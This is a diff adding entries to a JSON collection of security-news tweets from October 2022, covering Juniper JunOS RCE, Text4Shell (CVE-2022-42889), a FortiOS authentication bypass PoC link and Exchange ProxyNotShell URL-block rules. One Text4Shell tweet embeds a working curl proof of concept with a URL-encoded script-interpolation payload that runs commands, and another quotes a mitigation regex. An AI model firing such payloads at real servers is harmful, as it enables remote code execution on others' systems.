@@ -47,6 +47,19 @@
 }
 {
     "expanded_url": [
+        "https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/"
+    ],
+    "tweetfavorites": 124,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 40,
+    "tweettext": "CVE-2022-22241: Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities\nhttps://t.co/6zcuh6bWnY",
+    "tweettime": "2022-10-28, 14:56:18",
+    "tweeturl": "https://twitter.com/momika233/status/1586008963492982784",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
         "https://thehackernews.com/2022/10/google-issues-urgent-chrome-update-to.html"
     ],
     "tweetfavorites": 192,
@@ -230,10 +243,20 @@
     "username": "18a"
 }
 {
-    "tweetfavorites": 2940,
-    "tweetquotes": 44,
-    "tweetreplies": 53,
-    "tweetretweets": 528,
+    "tweetfavorites": 1037,
+    "tweetquotes": 4,
+    "tweetreplies": 28,
+    "tweetretweets": 293,
+    "tweettext": "Apache Text4Shell (CVE-2022-42889)\n\nPoC\ncurl http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.get.Runtime%28%29.exec%28%5C%27%27%2E%74%72%69%6D%28%24%63%6D%64%29%2E%27%5C%27%29%7D",
+    "tweettime": "2022-10-22, 17:10:44",
+    "tweeturl": "https://twitter.com/momika233/status/1583868470743035904",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 3105,
+    "tweetquotes": 49,
+    "tweetreplies": 55,
+    "tweetretweets": 535,
     "tweettext": "Remotely exploiting CVE-2022-34718, TCP/IP RCE bug #EvilEsp for DoS. This is a bug in Ipv6 fragmentation/IpSec, which allows OOB write if an Ipv6 fragment is contained inside an IpSec ESP payload. https://t.co/k1aoZX2kWq",
     "tweettime": "2022-10-22, 03:47:55",
     "tweeturl": "https://twitter.com/chompie1337/status/1583666434668101637",
@@ -343,6 +366,19 @@
     "tweettime": "2022-10-19, 05:34:18",
     "tweeturl": "https://twitter.com/TheHackersNews/status/1582606041606287360",
     "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/jfrog/text4shell-tools"
+    ],
+    "tweetfavorites": 183,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 68,
+    "tweettext": "CVE-2022-42889 text4shell? The vulnerability is also related to variable interpolation in Commons Text. This vulnerability (CVE-2022-33980) was found in the Apache Commons configuration and has the same severity as the new vulnerability.\nhttps://t.co/gPdAzvKqIG",
+    "tweettime": "2022-10-19, 01:04:12",
+    "tweeturl": "https://twitter.com/momika233/status/1582538070221475840",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -501,6 +537,19 @@
     "tweettime": "2022-10-14, 08:57:33",
     "tweeturl": "https://twitter.com/S0ufi4n3/status/1580845252784443392",
     "username": "S0ufi4n3"
+}
+{
+    "expanded_url": [
+        "https://github.com/NagliNagli/BountyTricks/blob/main/CVE-2022-40684.yaml"
+    ],
+    "tweetfavorites": 318,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 115,
+    "tweettext": "We have successfully managed to replicate and confirm the public PoC for CVE-2022-40684. which grants SSH access without any interaction to vulnerable FortiOS instances, with CVSS score of 9.6.\n\n#CVE-2022-40684\n\nhttps://t.co/9ZV4vcKbj9",
+    "tweettime": "2022-10-14, 01:06:18",
+    "tweeturl": "https://twitter.com/momika233/status/1580726659967496192",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -908,6 +957,19 @@
     "tweettime": "2022-10-04, 08:33:00",
     "tweeturl": "https://twitter.com/Vulnmachines/status/1577215196757561344",
     "username": "Vulnmachines"
+}
+{
+    "expanded_url": [
+        "https://www.youtube.com/watch?v=JQtW9xd5-Hw"
+    ],
+    "tweetfavorites": 217,
+    "tweetquotes": 8,
+    "tweetreplies": 14,
+    "tweetretweets": 79,
+    "tweettext": "The '@' in the Microsoft-recommended \".*autodiscover\\.json.*\\@.*Powershell.*\" URL block mitigations for CVE-2022-41040 CVE-2022-41082 seems unnecessarily precise, and therefore insufficient. Video:\nhttps://t.co/63VBV5o9Cr\nProbably try \".*autodiscover\\.json.*Powershell.*\" instead. https://t.co/NZy8tEvryZ",
+    "tweettime": "2022-10-03, 13:10:38",
+    "tweeturl": "https://twitter.com/wdormann/status/1576922677675102208",
+    "username": "wdormann"
 }
 {
     "tweetfavorites": 285,
